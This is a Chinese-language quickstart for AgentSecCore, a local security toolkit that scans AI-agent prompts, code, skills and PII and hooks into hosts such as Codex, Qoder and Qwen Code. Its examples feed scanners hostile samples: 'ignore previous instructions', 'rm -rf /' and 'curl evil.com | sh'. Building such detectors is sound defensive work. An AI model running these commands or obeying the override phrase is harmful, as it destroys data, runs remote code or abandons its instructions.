# AgentSecCore

[English](../../../en/agent-security/agent-sec-core/QUICKSTART.md)

AgentSecCore 是面向 AI Agent 的全本地安全内核，零 Token 消耗。提供纵深防御体系：提示词注入检测、代码扫描、技能完整性验证、敏感信息检测、系统加固和沙箱隔离。

Rust V2 SkillGuard 核心迁移见 [V2 指南](skillguard-v2.md)。
下文正式版本安装和 Agent 集成说明对应 V1。

## 概述

| 模块 | 说明 |
|------|------|
| Prompt Scanner | 规则引擎 + ML 分类器检测注入/越狱（4 模式：fast/standard/strict/multi_turn） |
| Code Scanner | bash/python 静态分析检测危险操作（判定：pass/warn/deny/error） |
| Skill Ledger | Ed25519 签名完整性追踪，6 状态生命周期（pass/none/drifted/warn/deny/tampered） |
| PII Checker | 检测文本中的个人信息和凭据（邮箱/手机/身份证/JWT/AccessKey 等） |
| Security Baseline | 系统安全基线扫描与加固（loongshield 后端） |
| Sandbox | 基于 seccomp + namespace 的 cosh 命令执行隔离 |
| Observability | 交互式事件审阅 TUI，4 级下钻 |
| Security Events | 本地安全事件存储，支持查询与聚合统计 |

## 前置条件

- 源码和 RPM 安装支持 Linux x86_64、aarch64
- ANOLISA raw 包仅支持 Linux x86_64 和 system mode
- Python 3.11.6（固定版本）
- ANOLISA CLI 0.2.17 或更高版本
- 安装需要 root 权限（system mode）

## 安装

先根据 CLI 的安装来源完成更新，再用 system mode 安装组件。

```bash
# 通过 get.agentic-os.sh 安装的 CLI
anolisa update self

# 由 RPM 管理的 CLI
sudo anolisa update self

sudo anolisa --install-mode system install sec-core
sudo anolisa status sec-core
agent-sec-cli --version
```

`sec-core` 是 ANOLISA 中的组件名。RPM 继续使用原有包名
`agent-sec-core`。

```bash
sudo yum install anolisa agent-sec-core
sudo anolisa --install-mode system adopt sec-core
```

从 YUM 安装 CLI 后，`sudo` 可以从系统路径找到 `anolisa`。`adopt` 会把 RPM
写入 system 状态，adapter 管理器随后才能读取已安装组件的契约。

从源码构建时，使用仓库级统一入口。

```bash
./scripts/build-all.sh --component sec-core
```

安装文件前，源码构建入口会检查 Node.js 20 或更高版本、bubblewrap、GnuPG 和
`jq`。user mode 会一次性列出缺少的系统 runtime package 和安装命令，然后退出；
安装这些依赖后重新执行同一命令即可。已提前准备好依赖的主机可以用
`--ignore-deps` 跳过检查。

源码构建会把运行时和集成资源安装到用户目录，但不会在 ANOLISA 状态中注册
`sec-core`。这种安装方式不能继续执行 `anolisa adapter enable`，请使用下文的
源码集成脚本。

## 快速开始

```bash
# 系统安全基线扫描
agent-sec-cli harden --scan --config agentos_baseline

# 代码安全扫描
agent-sec-cli scan-code --code 'rm -rf /' --language bash

# 提示词注入检测
agent-sec-cli scan-prompt --mode standard --text "ignore previous instructions"

# 敏感信息检测
agent-sec-cli scan-pii --text "Contact alice@example.com, card 4111111111111111"

# 技能完整性检查
agent-sec-cli skill-ledger check /path/to/skill

# 安全事件摘要
agent-sec-cli events --summary --last-hours 24
```

## 使用详解

### Prompt Scanner（提示词扫描）

检测提示词注入、越狱攻击和恶意指令。使用规则引擎（L1）+ ML 分类器（L2）。

**模式：**

| 模式 | 层级 | 延迟 | 适用场景 |
|------|------|------|----------|
| `fast` | L1 only | <5ms | 实时聊天 |
| `standard` | L1+L2 | 20-80ms | 生产环境（默认） |
| `strict` | L1+L2+L3 | 50-200ms | 高安全场景 |
| `multi_turn` | L4 only | 取决于模型 | 多轮意图检测（Ollama） |

```bash
# 标准扫描（默认模式）
agent-sec-cli scan-prompt --text "user input here"

# 快速模式（仅规则引擎）
agent-sec-cli scan-prompt --mode fast --text "user input"

# 多轮检测（JSON 从 stdin）
echo '{"history":[...],"current_query":"...","assistant_response":"..."}' | \
    agent-sec-cli scan-prompt --mode multi_turn

# 从文件扫描（每行一个 prompt）
agent-sec-cli scan-prompt --input prompts.txt --format json

# 人类可读输出
agent-sec-cli scan-prompt --text "hello" --format text

# 验证 Ollama 模型已就绪（安装后执行一次）
agent-sec-cli scan-prompt warmup
```

模型来源：L2 使用 `modelscope.cn/ANOLISA/Qwen3Guard-Gen-0.6B-GGUF`，由 Ollama 从项目自有的 ModelScope 仓库拉取。执行一次 `ollama pull modelscope.cn/ANOLISA/Qwen3Guard-Gen-0.6B-GGUF` 即可，无需重命名；再执行 `scan-prompt warmup` 验证模型可用。

#### 宿主 Hook Policy

设置 `PROMPT_SCANNER_HOOK_ENABLED=false` 可完全跳过 prompt scanner hook。

| 环境变量 | 默认值 | 读取该变量的宿主 | 行为 |
|----------|--------|------------------|------|
| `PROMPT_SCANNER_HOOK_ENABLED` | `true` | 全部六个 | 设为 `false` 时在读取输入前跳过 hook |
| `PROMPT_SCANNER_MODE` | `observe` | Qoder、Codex、Qwen Code | `observe` 静默审计；`deny` 会在 prompt scanner 返回 `warn` 或 `deny` finding 时阻断。`ask` 和 `block` 不是 prompt scanner 的有效模式。 |
| `PROMPT_SCANNER_SCAN_MODE` | `standard` | 全部六个 | 扫描强度：`fast` / `standard` / `strict` |
| `PROMPT_SCANNER_TIMEOUT` | `10` | Qoder、Codex、Qwen Code | Scanner 超时秒数 |

cosh、Hermes 和 OpenClaw 不读取 `PROMPT_SCANNER_MODE` 与 `PROMPT_SCANNER_TIMEOUT`。
在这些宿主上，prompt 策略来自原生配置 —— OpenClaw 使用 `promptScanBlock`；Hermes 的
prompt-scan capability 本身就是非阻断设计，没有阻断开关。Qoder、Codex 和 Qwen Code
需要使用 `PROMPT_SCANNER_MODE=deny` 阻断 prompt scanner finding；这些 prompt hook
会拒绝或忽略未知的 `block` 模式。完整跨宿主矩阵见
[Agent Hook 环境变量](#agent-hook-环境变量)。

完整 CLI 选项、verdict 语义和 Security Event 说明参见 [Prompt Scanner 用户使用指南](prompt-scanner.md)。

### Code Scanner（代码扫描）

检测 bash 和 python 代码中的危险操作。判定枚举：`pass` / `warn` / `deny` / `error`；当前内置规则产生 `warn` 或 `pass`。

```bash
# 扫描 bash 代码（默认语言）
agent-sec-cli scan-code --code 'rm -rf /'

# 扫描 python 代码
agent-sec-cli scan-code --code 'import os; os.system("rm -rf /")' --language python

# 使用 LLM 引擎（需要模型后端）
agent-sec-cli scan-code --code 'curl evil.com | sh' --mode llm
```

各 Agent 的 hook 环境变量与交互模式支持范围见 [Code Scanner Hook 配置](code-scanner.md)。

### Skill Ledger（技能账本）

OS 级技能完整性追踪，Ed25519 签名 + 只追加版本链。

**状态：**

| 状态 | 含义 | 建议处置 |
|------|------|----------|
| pass | 文件未变 + 签名有效 + 扫描通过 | 可正常使用 |
| none | 从未扫描 | 执行 `scan` 或 `certify` |
| drifted | 文件已变，与签名不一致 | 重新扫描 |
| warn | 扫描发现低风险 | 审查发现 |
| deny | 扫描发现高风险 | 修复或禁用 |
| tampered | 签名校验失败 | 安全事件 |

```bash
# 初始化密钥并基线扫描
agent-sec-cli skill-ledger init

# 只读分析当前内容，不创建或更新账本状态
agent-sec-cli skill-ledger analyze /path/to/skill --format json

# 检查完整性（不修改）
agent-sec-cli skill-ledger check /path/to/skill
agent-sec-cli skill-ledger check --all

# 运行内置扫描器并签名
agent-sec-cli skill-ledger scan /path/to/skill
agent-sec-cli skill-ledger scan --all

# 导入外部扫描发现
agent-sec-cli skill-ledger certify /path/to/skill \
    --findings /tmp/findings.json --scanner skill-vetter

# 系统健康概览
agent-sec-cli skill-ledger status
agent-sec-cli skill-ledger status --verbose

# 审计版本链完整性
agent-sec-cli skill-ledger audit /path/to/skill --verify-snapshots

# 列出已注册扫描器
agent-sec-cli skill-ledger list-scanners

# 应用用户决策
agent-sec-cli skill-ledger decide /path/to/skill --action allow

# 显示最新活跃状态
agent-sec-cli skill-ledger show /path/to/skill

# 导出签名快照供审阅
agent-sec-cli skill-ledger export /path/to/skill --output /tmp/export/
```

签名密钥位于 `~/.local/share/agent-sec/skill-ledger/`。

#### 在 Qoder 中体验调用前检查

Qoder adapter 会在本地 `Skill` Tool 调用前检查签名状态。你可以用一个固定输出的
测试 Skill 依次看到 `pass`、`drifted` 和 `deny`，并在修改后的内容执行前取消调用。

[打开完整的 Qoder Skill Ledger 演示](./qoder-skill-ledger-demo.md)

### PII Checker（敏感信息检测）

检测文本输入中的个人信息和凭据。

```bash
# 直接扫描文本
agent-sec-cli scan-pii --text "Contact alice@example.com" --source manual

# 从 stdin 扫描
echo "my key is AKID1234567890" | agent-sec-cli scan-pii --stdin --format json

# 从文件扫描
agent-sec-cli scan-pii --input ./sample.log --source user_input

# 带脱敏输出
agent-sec-cli scan-pii --text "card 4111111111111111" --redact-output

# 包含低置信度发现
agent-sec-cli scan-pii --text "some text" --include-low-confidence
```

#### 宿主 Hook Policy

六个宿主都会执行 PII 检测。默认启用 observe-only 和 fail-open；原始扫描内容只通过
stdin 传给 `scan-pii`，告警只使用脱敏 evidence。

| 环境变量 | 默认值 | 读取该变量的宿主 | 行为 |
|----------|--------|------------------|------|
| `PII_CHECKER_HOOK_ENABLED` | `true` | 全部六个 | 设为 `false` 时在读取输入前跳过 PII hook |
| `PII_CHECKER_MODE` | `observe` | 全部六个 | `observe` 静默审计；`warn` 告警；`ask`/`block` 按宿主能力执行或 fallback；`debug` 等价于 `observe`，`deny` 等价于 `block` |
| `PII_CHECKER_TIMEOUT` | `5` | Qoder、Codex、Qwen Code | scanner 超时秒数；Qwen Code 上限为 8 秒 |
| `PII_CHECKER_INCLUDE_LOW_CONFIDENCE` | `false` | Qoder、Qwen Code | 开启后传递 `--include-low-confidence` |
| `PII_CHECKER_ENABLED` | - | 仅 Qwen Code | 旧 enabled 变量；仅在 `PII_CHECKER_HOOK_ENABLED` 缺失时生效 |

#### Qwen Code 阻断边界

Qwen Code extension 会扫描用户输入、工具输入、成功及失败的工具输出和最终模型输出。

```bash
# 启用扩展，再以阻断模式启动 Qwen Code
anolisa adapter enable sec-core qwencode
PII_CHECKER_MODE=block qwen
```

用户输入和工具输入可在执行前阻断。工具成功执行后才触发 `PostToolUse`，此时副作用已经
发生；Qwen Code 0.19.9 会消费 `continue:false`，在下游正常处理前把成功结果转为
hook-stopped error，但不能撤销工具副作用。该版本的 `PostToolUseFailure` 不消费阻断字段，
因此失败输出只能扫描和审计，仍进入既有错误处理链。最终模型输出命中 deny 时只要求重写
一次；重复进入 `Stop` 时不再阻断，以避免重试循环。Qwen Code 当前没有 pre-render 输出
替换 Hook，因此模型输出阻断属于尽力而为。

### Security Baseline（安全基线）

通过 `agent-sec-cli harden` 执行系统安全加固（Alinux 上底层调用 loongshield seharden）。

```bash
# 合规扫描（默认 agentos_baseline 配置）
agent-sec-cli harden --scan --config agentos_baseline

# 预演修复（dry run）
agent-sec-cli harden --reinforce --dry-run --config agentos_baseline

# 执行加固（需要 root）
agent-sec-cli harden --reinforce --config agentos_baseline

# OpenClaw 专属基线
agent-sec-cli harden --scan --level openclaw

# 显示完整 loongshield 帮助
agent-sec-cli harden --downstream-help
```

### Observability（可观测）

交互式事件审阅工具，用于审计 Agent 行为。

六个集成默认启用 Observability hook。若需停止 hook 记录，请在启动宿主前设置
`OBSERVABILITY_HOOK_ENABLED=false`；修改后需重启宿主进程。该变量仅接受
`true` / `false`（忽略大小写和首尾空白）；未设置或值无效时保持默认开启。

`OBSERVABILITY_TIMEOUT` 控制每次本地 PII 脱敏和 Observability 数据写入 CLI 调用的超时秒数。
其余五个非 Hermes 集成默认使用 `5`；未设置、为空、非法或非正数时也使用 `5`。
Hermes 则回退到 Observability capability 的 `timeout`，并将其封顶为 `5`；有效环境变量
大于 `5` 时，所有集成都封顶为 `5`。

对于 OpenClaw 和 Hermes，原有 Observability capability 的 `enabled` 配置仍是独立开关。
任一开关关闭都会停止记录；`OBSERVABILITY_HOOK_ENABLED=true` 不会覆盖插件配置中已关闭的
capability。

```bash
export OBSERVABILITY_HOOK_ENABLED=false
export OBSERVABILITY_TIMEOUT=5
```

```bash
# 打开交互式 TUI（需要交互终端）
agent-sec-cli observability review

# 记录可观测事件（插件调用，通过 stdin）
echo '{"hook":"before_tool_call",...}' | agent-sec-cli observability record --stdin

# 输出可观测记录 JSON Schema
agent-sec-cli observability schema

# 按会话生成报告
agent-sec-cli observability report --last
agent-sec-cli observability report --session-id <id> --format json
```

### Security Events（安全事件）

查询本地安全事件存储。

```bash
# 最近事件（table 格式，默认）
agent-sec-cli events --last-hours 24

# JSON 输出
agent-sec-cli events --last-hours 24 --output json

# 按类别过滤
agent-sec-cli events --category prompt_scan

# 按时间范围过滤
agent-sec-cli events --since 2026-01-01T00:00:00 --until 2026-01-02T00:00:00

# 统计事件数量
agent-sec-cli events --count --last-hours 24

# 按类别分组统计
agent-sec-cli events --count-by category --last-hours 24

# 分页
agent-sec-cli events --offset 50 --limit 20

# 安全态势摘要
agent-sec-cli events --summary
```

### Agent Capability 视图

`agent-sec-cli capabilities` 展示当前 CLI 进程可见环境变量推导出的 Qoder、Qwen Code、Codex、Cosh、OpenClaw 和 Hermes hook capability 视图。它不是运行时健康检查，不能证明 hook 已在目标 Agent 进程中加载、注册或实际生效。

若希望结果尽量接近目标 Agent，请在启动目标 Agent 的同一 shell/container/service 环境中运行该命令。命令不读取 OpenClaw、Hermes 或其他 Agent 的配置文件，也不解析 Agent home 目录；Agent 配置中的 enabled、policy、timeout 等值仍可能让真实运行行为与该视图不同。

```bash
# 展示所有 agent 的所有 capability
agent-sec-cli capabilities

# 按 agent 查询
agent-sec-cli capabilities --agent openclaw

# 按 capability 查询
agent-sec-cli capabilities --capability prompt-scan

# 同时按 agent 和 capability 查询
agent-sec-cli capabilities --agent hermes --capability code-scan

# JSON 输出，便于脚本消费
agent-sec-cli capabilities --agent qwen --capability pii-check --output json
```

支持的 capability 名称只能是 `code-scan`、`prompt-scan`、`pii-check`、`skill-ledger` 和 `observability`；`scan-code`、`prompt-scan-user-input`、`pii-scan-user-input` 等插件内部 ID 会被拒绝。表格输出按 Agent 分块展示，仅包含 `CAPABILITY`、`ENABLED`、`MODE`、`SCAN_MODE`、`TIMEOUT(s)` 和 `DIAGNOSTICS`；`MODE` 表示 hook 交互方式，`SCAN_MODE` 表示 prompt scanner 引擎档位（`fast`、`standard` 或 `strict`）。JSON 输出使用同样的用户可见字段，并包含经过脱敏投影的 `env` 条目，其中只含 `effective` 和 `default`。两种格式都不会暴露 hook matcher 列表、source 标签、Agent config 内容、config 路径或原始环境变量值。诊断信息只说明哪个设置无效及 fallback 行为，不回显原始值。

当前配置的 L2 后端是唯一有意保留的例外：模型名只有原样展示才有意义，因此 `PROMPT_SCANNER_L2_MODEL` 会作为 `prompt-scan` 的 `env` 条目原样上报（保留大小写，并做转义与长度封顶）。它的 `default`（以及变量未设置时的 `effective`）取自 native 扫描引擎上报的默认后端；若取值不属于引擎支持的后端，则原样上报并附一条 diagnostic——因为引擎会在构造期直接报错，扫描会失败而不是回退到默认后端。而宿主 hook 对失败的扫描一律 fail-open，因此这条 diagnostic 往往是该配置错误在 prompt 开始无防护流转前唯一的可见之处。它没有对应的表格列，请用 `--capability prompt-scan --output json` 读取。

视图来源和限制：

- 来源：静态 hook capability metadata 加当前 CLI 进程可见的环境变量。
- 不包含：OpenClaw、Hermes 或其他 Agent 配置文件；Agent home 目录；实时 hook 加载或注册状态。
- 已知偏移：从不同 shell/container/service 运行命令，或真实 Agent 使用不同配置时，输出可能与真实运行行为不同。
- 已知偏移：L2 后端的默认值和“不支持的后端”检查都来自 native 扫描引擎，所以在扩展尚未编译时，视图会把 `PROMPT_SCANNER_L2_MODEL` 的 default 报为空，也无法标记不支持的模型名。

## Agent Hook 环境变量

每个宿主都会读取 `<CAPABILITY>_HOOK_ENABLED`（`true` / `false`，忽略大小写和首尾
空白）。未设置或值无效时保持 hook 开启。对于使用 shared hook policy parser 的
capability，`<CAPABILITY>_MODE` 决定 finding 的处置方式；`debug` 是 `observe`
的别名，`deny` 是 `block` 的别名。Prompt Scanner 更窄：`PROMPT_SCANNER_MODE`
只接受 `observe` 和 `deny`。宿主在加载插件时读取这些变量，修改后需重启宿主进程。

**并非每个变量都被所有宿主消费。** 下表反映 adapter 代码实际读取的情况
（✓ = 该宿主会读取，✗ = 不读取）：

| 变量 | 默认值 | cosh | Qoder | Codex | Qwen Code | Hermes | OpenClaw |
|------|--------|------|-------|-------|-----------|--------|----------|
| `CODE_SCANNER_HOOK_ENABLED` | `true` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `CODE_SCANNER_MODE` | `observe`（cosh 为 `ask`） | ✓（仅 `ask`） | ✓ | ✓ | ✓ | ✓ | ✓ |
| `CODE_SCANNER_TIMEOUT` | `10` | ✗ | ✓ | ✓ | ✓ | ✗ | ✗ |
| `PROMPT_SCANNER_HOOK_ENABLED` | `true` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `PROMPT_SCANNER_MODE` | `observe` | ✗ | ✓ | ✓ | ✓ | ✗ | ✗ |
| `PROMPT_SCANNER_SCAN_MODE` | `standard` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `PROMPT_SCANNER_L2_MODEL` | 未设置（Qwen3Guard） | ✓* | ✓* | ✓* | ✓* | ✓* | ✓* |
| `PROMPT_SCANNER_TIMEOUT` | `10` | ✗ | ✓ | ✓ | ✓ | ✗ | ✗ |
| `PII_CHECKER_HOOK_ENABLED` | `true` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `PII_CHECKER_MODE` | `observe` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `PII_CHECKER_TIMEOUT` | `5` | ✗ | ✓ | ✓ | ✓ | ✗ | ✗ |
| `PII_CHECKER_INCLUDE_LOW_CONFIDENCE` | `false` | ✗ | ✓ | ✗ | ✓ | ✗ | ✗ |
| `PII_CHECKER_ENABLED`（旧开关） | — | ✗ | ✗ | ✗ | ✓ | ✗ | ✗ |
| `SKILL_LEDGER_HOOK_ENABLED` | `true` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `SKILL_LEDGER_MODE` | `ask` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `SKILL_LEDGER_TIMEOUT` | `5` | ✗ | ✓ | ✓ | ✗ | ✗ | ✗ |
| `OBSERVABILITY_HOOK_ENABLED` | `true` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `OBSERVABILITY_TIMEOUT` | `5` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |

`PROMPT_SCANNER_L2_MODEL` 标记为 `✓*`，因为没有任何 adapter 直接读取它：每个宿主都
是调用 `agent-sec-cli scan-prompt` 子进程，由该命令解析 L2 后端，所以六家都会继承
宿主进程环境中的取值。值为空或只有空白等同于未设置，仍使用内置的 Qwen3Guard 后端；
其余不支持的模型名会让扫描在引擎构造期直接失败，而不是静默关掉 L2——但每个宿主 hook 对
`scan-prompt` 的非零退出码都是 fail-open，该失败只会被审计、不会阻断，因此在改回正确
模型名之前该宿主都没有 prompt 防护。
可选后端见 [Prompt Scanner](prompt-scanner.md)。

矩阵中的默认值 `5` 与其余五个非 Hermes 集成及 Hermes 随附配置一致。对于 Hermes，
`OBSERVABILITY_TIMEOUT` 未设置、为空、非法或非正数时，会回退到 Observability capability
的 `timeout` 并封顶为 `5`，因此更低的 capability 配置值仍然生效。有效环境变量大于 `5`
时，所有集成都封顶为 `5`。

若某宿主不读取某个变量，则由该宿主的原生配置决定行为。例如 OpenClaw 的 prompt
策略来自 `promptScanBlock`、code-scan 策略来自 `codeScanRequireApproval`；Hermes 则
对 `code-scan` 使用 `enable_block`、对 `pii-scan-user-input` 使用 `policy`。Hermes 的
`prompt-scan-user-input` capability 根本没有阻断开关。

对于 Hermes 和 OpenClaw，capability 的 `enabled` 配置仍是独立开关。任一开关关闭都会
停用该 hook；把 `<CAPABILITY>_HOOK_ENABLED` 设为 `true`，不会重新启用已在插件配置中
关闭的 capability。`PII_CHECKER_ENABLED` 只是 Qwen Code 旧开关 fallback：仅当
`PII_CHECKER_HOOK_ENABLED` 缺失时读取，其它宿主完全忽略。

各宿主 Code Scanner 的 mode 语义与 fallback 行为见
[Code Scanner Hook 配置](code-scanner.md)。

## Agent 框架集成

通过 ANOLISA 管理的 raw 包或已执行 `adopt` 的 RPM 会放置可用 adapter，
但不会直接改动 Agent 框架的用户配置。请用拥有该框架配置的用户执行
adapter 命令。

```bash
anolisa adapter scan
anolisa adapter enable sec-core openclaw
```

其他已打包的集成可以把 `openclaw` 换成 `hermes`、`qwencode`、`cosh`、
`codex` 或 `qoder`。

### 源码集成入口

默认源码构建会把 cosh 扩展直接安装到
`~/.copilot-shell/extensions/agent-sec-core`，无需再执行启用命令。其他集成请
运行用户目录中对应的脚本。

```bash
# OpenClaw
bash ~/.local/lib/anolisa/sec-core/openclaw-plugin/scripts/deploy.sh

# Hermes
bash ~/.local/lib/anolisa/sec-core/hermes-plugin/scripts/deploy.sh

# Qwen Code
bash ~/.local/lib/anolisa/sec-core/qwen-code-extension/scripts/deploy.sh

# Codex
bash ~/.local/lib/anolisa/sec-core/codex-plugin/install.sh

# Qoder
bash ~/.local/lib/anolisa/sec-core/qoder-plugin/install.sh
```

### OpenClaw

使用 ANOLISA 启用 adapter。

```bash
anolisa adapter enable sec-core openclaw
```

部署后配置：

```bash
# 启用 prompt 扫描拦截
openclaw config set plugins.entries.agent-sec.config.promptScanBlock true

# 启用代码扫描审批模式
openclaw config set plugins.entries.agent-sec.config.codeScanRequireApproval true

# 重启 gateway 加载
openclaw gateway restart
```

### Hermes

使用 ANOLISA 启用 adapter。

```bash
anolisa adapter enable sec-core hermes
```

插件配置位于 `~/.hermes/plugins/agent-sec-core-hermes-plugin/config.toml`：

```toml
[capabilities.code-scan]
enabled = true
timeout = 10
enable_block = false    # false=观察模式, true=阻断

[capabilities.pii-scan-user-input]
enabled = true
timeout = 10
policy = "observe"      # observe（默认）| block
include_low_confidence = false

[capabilities.prompt-scan-user-input]
enabled = true
timeout = 15

[capabilities.observability]
enabled = true
timeout = 5

[capabilities.skill-ledger]
enabled = true
timeout = 5
policy = "observe"      # observe（默认）| block
```

`timeout` 是 Hermes 每个 capability 的必填项。`prompt-scan-user-input` 本身是非阻断
的 audit-only 能力，不注册 `transform_llm_output`，也没有 `enable_block` 或 `policy`
字段。PII Checker 和 Skill Ledger 的旧 `warn` / `ask` policy 会降级为 `observe` 并写
宿主诊断。Hermes 不注册 PII model-output transform；`block` 只在原生
`pre_tool_call` 边界生效，模型输出则在 `post_llm_call` 执行 audit-only 扫描。这里的
`timeout = 15` 是 Hermes capability 配置，不是
`PROMPT_SCANNER_TIMEOUT`；Hermes 不读取 prompt scanner timeout 环境变量。

### Qwen Code

使用 ANOLISA 启用 user scope 扩展。

```bash
anolisa adapter enable sec-core qwencode
```

同步 `PreToolUse` hook 只保护由模型触发的 Qwen Code `skill` Tool 调用，且仅覆盖
已纳管的项目 Skill（`.qwen/skills`）和个人 Skill（`$QWEN_HOME/skills`，未设置时
默认为 `~/.qwen/skills`）。需要先扫描或认证每个 Skill；这些命令会 best-effort
将目录加入 `managedSkillDirs`：

```bash
agent-sec-cli skill-ledger scan .qwen/skills/<skill>
agent-sec-cli skill-ledger scan "${QWEN_HOME:-$HOME/.qwen}/skills/<skill>"
agent-sec-cli skill-ledger show .qwen/skills/<skill>
agent-sec-cli skill-ledger show "${QWEN_HOME:-$HOME/.qwen}/skills/<skill>"
```

`show` 仅在 Skill 未纳管时返回 `managed=false`；不含该标记的正常 exposure summary
表示已纳管。未纳管 Skill 始终 fail-open，包括显式启用 block 的情况。默认 policy
为 `ask`；请在启动 Qwen Code 的可信环境中设置 policy：

```bash
SKILL_LEDGER_MODE=observe qwen  # 仅观察
SKILL_LEDGER_MODE=warn qwen   # 返回非阻断诊断后继续
SKILL_LEDGER_MODE=ask qwen    # 使用前请求确认（默认）
SKILL_LEDGER_MODE=block qwen  # exposure warning 非空时拒绝
```

Qwen Code 0.19.9 会将非阻断 `systemMessage` 记录到 session debug 日志，但不在 TTY
中展示；原生 `permissionDecision=ask/deny` 和可执行的 `block` 决策不受影响。

hook 遵循现有 Skill Ledger exposure message，包括已有的 `decide` 决策。正常的
`pass` 和 `warn` 状态会放行；已纳管的 `none`、`drifted`、`deny` 和 `tampered`
状态在 exposure message 非空时可按 policy 告警、询问或阻断。Qwen Code 无法交互
的场景（例如 headless 执行和后台 subagent）会将 `ask` 退化为拒绝。

只有 Qwen Code 会向模型暴露的磁盘 Skill 才进入 Ledger 校验。被
`disable-model-invocation` 或 `skills.disabled` 隐藏的磁盘 Skill 会 fail-open，
因此其 Ledger 状态不会误拦同名 file command 或 MCP prompt。Qwen settings 不可读或
无法解析时同样 fail-open，因为公开 HookInput 不包含最终分派来源。

保护边界明确排除直接 `/skill-name` 和 stacked slash Skill 展开、extension Skill、
`.agents/skills`、bundled Skill，以及目标离开对应 `.qwen/skills` 根目录的符号链接。
CLI 或密钥缺失、初始化失败、路径或 settings 不可访问或歧义、超时及输出异常都会
记录诊断并 fail-open。本集成不提供启动预检、后台扫描、缓存或配置自动修复。

### Codex

通过 ANOLISA 启用 adapter。

```bash
anolisa adapter enable sec-core codex
```

adapter 会通过内置的 `agent-sec` marketplace 把 `agent-sec-core` 注册为 Codex 插件，
因此启用前 `codex` 和 `agent-sec-cli` 都需在 `PATH` 中。已注册的 hook：

| Codex hook | 检查项 |
|------------|--------|
| `UserPromptSubmit` | prompt scanner、PII checker、Skill Ledger、observability |
| `PreToolUse` | code scanner（`Bash` matcher）、PII checker、observability |
| `PostToolUse` | PII checker、observability |
| `Stop` | observability |

Codex 的 `CODE_SCANNER_MODE` 支持 `observe` 和 `block`，`ask` 被视为未设置。
prompt scanner 是独立模式，只接受 `observe` 或 `deny`；如需阻断 prompt，请使用
`PROMPT_SCANNER_MODE=deny`。在启动 Codex 的环境中设置策略：

```bash
CODE_SCANNER_MODE=block PROMPT_SCANNER_MODE=deny PII_CHECKER_MODE=block codex
```

### Qoder

通过 ANOLISA 启用 adapter。

```bash
anolisa adapter enable sec-core qoder
```

adapter 会通过 `qodercli plugins install` 安装 Qoder CLI 插件。完成后请重启 Qoder CLI
或执行 `/plugins reload`。已注册的 hook：

| Qoder hook | 检查项 |
|------------|--------|
| `UserPromptSubmit` | observability、PII checker、prompt scanner |
| `PreToolUse` | observability、Skill Ledger（`Skill` matcher）、code scanner（`Bash` matcher）、PII checker |
| `PostToolUse` | observability、PII checker |
| `PostToolUseFailure` | observability |
| `Stop` / `StopFailure` | observability |

Skill Ledger hook 先从 `~/.qoder/skills/` 解析用户级 Skill，再从
`<cwd>/.qoder/skills/` 解析项目级 Skill，随后执行只读的 `skill-ledger check`，并
按 `SKILL_LEDGER_MODE`（默认 `ask`）处理结果。每次检查都会把 Qoder trace 标识写入
安全审计日志。

Qoder 的 `CODE_SCANNER_MODE` 支持 `observe`、`ask` 和 `block`。prompt scanner 是独立
模式，只接受 `observe` 或 `deny`；如需阻断 prompt，请使用 `PROMPT_SCANNER_MODE=deny`：

```bash
CODE_SCANNER_MODE=ask PROMPT_SCANNER_MODE=deny SKILL_LEDGER_MODE=block qoder
```

### Copilot Shell（cosh）

通过安装包部署时，在目标用户的配置中启用 adapter。

```bash
anolisa adapter enable sec-core cosh
```

cosh 启动时会加载 hook。

扩展路径：
- 用户安装：`~/.copilot-shell/extensions/agent-sec-core/`
- RPM 安装：`/usr/share/anolisa/extensions/agent-sec-core/`

## 常见问题

**Q: AgentSecCore 是否消耗 Token？**

A: 不消耗。全部本地运行，无外部 API 调用，无 Token 开销。

**Q: `harden` 和 `loongshield` 有什么区别？**

A: `agent-sec-cli harden` 是 ANOLISA 统一入口，底层调用 `loongshield seharden` 并自动添加 `agentos_baseline` 配置。Alinux 上两者都可用；`harden` 省去了手动指定配置的步骤。

**Q: 如何更新 Prompt Scanner 的 ML 模型？**

A: 执行 `ollama pull modelscope.cn/ANOLISA/Qwen3Guard-Gen-0.6B-GGUF` 拉取当前模型，
再执行 `agent-sec-cli scan-prompt warmup` 验证 Ollama 能否提供该模型。`warmup` 不会
自动下载模型。

**Q: Skill Ledger 出现 `tampered` 怎么办？**

A: 说明文件未变但数字签名校验失败——签名元数据本身可能被篡改。立即停用该 Skill 并排查。
